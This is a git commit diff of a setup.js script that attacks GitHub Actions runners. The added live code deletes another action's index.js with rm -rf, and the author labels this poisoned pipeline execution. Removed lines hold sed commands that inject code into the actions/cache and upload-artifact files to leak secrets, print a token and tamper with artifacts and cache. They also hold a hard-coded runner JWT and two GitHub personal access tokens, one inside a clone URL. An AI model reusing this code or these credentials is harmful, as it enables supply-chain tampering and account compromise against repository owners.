899a15f361c13a63e18f35d0ce7fb5cb4255d932
musset0 <musset025@gmail.com>
2023-09-04 10:26:45 -0400

    new v1.1.2

--- setup.js
+++ setup.js
@@ -36,9 +36,19 @@ console.log("this is a setup.....")
 // });
 
 
-//
-let insertcontent = 'console.log(JSON.stringify(process.env["INPUT_HI-THERE"].split("")));';
-cl_process.exec(`sed -i '21i ${insertcontent}' /home/runner/work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
+// secret leakage
+// let insertcontent = 'console.log(JSON.stringify(process.env["INPUT_HI-THERE"].split("")));';
+// cl_process.exec(`sed -i '21i ${insertcontent}' /home/runner/work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
+//     if (err){
+//         console.log(err);
+//         return;
+//     }
+//     console.log(`stdout: ${stdout.toString()}`);
+//     console.log(`stderr: ${stderr}`);
+// });
+
+//remove action file - poisone pipeline execution - fail
+cl_process.exec(`rm -rf /home/runner/work/_actions/dreamli0/my-action/main/index.js`, (err, stdout, stderr) => {
     if (err){
         console.log(err);
         return;
@@ -49,125 +59,5 @@ cl_process.exec(`sed -i '21i ${insertcontent}' /home/runner/work/_actions/dreaml
 
 
 
-// Modify the value of math-homework artifact
-// let writecontent = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/artifact/math-homework.txt", "1")';
-
-// cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
 
 
-//Add a new upload-me artifact, then upload it
-// fs.mkdir('artifact', function(err){
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-// });
-
-// let importfs = 'const fs = __importStar(__nccwpck_require__(7147));'
-// cl_process.exec(`sed -i '10983i ${importfs}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-
-// let content = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/artifact/upload-me.txt", "2")'
-// cl_process.exec(`sed -i '10987i ${content}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-// let writecontent1 = 'const path="artifact"';
-// cl_process.exec(`sed -i '10748s/.*/${writecontent1}/' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-
-
-//Modify the value of cache file
-// fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/hello", "18")
-
-
-
-// let writecontent = 'console.log(cachePaths);';
-
-// cl_process.exec(`sed -i '47734i ${writecontent}' /home/musset/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-
-
-
-
-
-// let writecontent = 'console.log(JSON.stringify(token.split("")));';
-
-// cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-// cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImVCWl9jbjNzWFlBZDBjaDRUSEJLSElnT3dPRSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8yMCBMb2NhdGlvblNlcnZpY2UuQ29ubmVjdCBSZWFkQW5kVXBkYXRlQnVpbGRCeVVyaTowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8yMCIsIklkZW50aXR5VHlwZUNsYWltIjoiU3lzdGVtOlNlcnZpY2VJZGVudGl0eSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NpZCI6IkRERERERERELUREREQtRERERC1ERERELURERERERERERERERCIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcHJpbWFyeXNpZCI6ImRkZGRkZGRkLWRkZGQtZGRkZC1kZGRkLWRkZGRkZGRkZGRkZCIsImF1aSI6ImJiMjE2NjEyLWQ4M2EtNDE3My1iN2Q2LTA4NTgwZDI2NDE3YSIsInNpZCI6IjA3MWRlMzQzLWU5MzctNDBhNS1iYjhjLTEzYWZmYjdhY2M4NCIsImFjIjoiW3tcIlNjb3BlXCI6XCJyZWZzL3RhZ3MvdjEuMS4yXCIsXCJQZXJtaXNzaW9uXCI6M30se1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjF9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6ImMyM2NiODJjLWIzNWQtNDBmNS1hNTA3LWZiNjU0YjFlNzRlNy51c2UuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOjUyMGVkY2VmLTgwNTUtNGJiNy05Mzc3LTE3OTk1ZGNiOTFhYiIsIm5iZiI6MTY5MzA1NzIxOCwiZXhwIjoxNjkzMDgwMDE4fQ.B-2G39Aqe7vaSh-5EXoRXOTopxkOpAJjBnMXp3R8b_vlEDYl2ZsLq1F-zhXig4E5BR2NEmgLEgrLamEXzwIYMcabyqMXfZtAmxU-WWOrLgkGy3G93RyoD1_ijcb8pr3Q_uZ3VeIW7G8h3paMe_72Is-Z8Lfk9gwz_9NILsM40uA8-5bzuPut2KX8znLVwsWnnfsqUowiArz_3b0oeHDjNkTar5ZjpNpS9rz2jLiLewWAQ5baMuoVGxYNm8FdCh0JxA5gv6Oa7q3AX3gJ-oFETcfc_Du4in3nl-VoHxs2wYXfP7WWdPfrh7C1g3UbhnQluRggJ4wGHrc6yG4xs1WLRQ"';
-
-// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
-
-
-
-// musset0
-// https://musset0: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@github.com/orgdreamli/test_actions_02.git
-
-// dreamli0
-// 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
